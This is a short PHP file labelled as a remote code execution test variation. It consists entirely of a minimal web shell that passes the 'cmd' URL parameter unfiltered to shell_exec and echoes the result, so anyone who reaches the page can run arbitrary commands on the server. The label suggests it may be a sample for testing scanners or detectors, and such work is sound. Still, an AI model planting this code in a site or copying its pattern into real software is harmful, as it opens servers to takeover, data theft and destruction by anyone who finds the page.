<?php
// RCE test variation #296
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>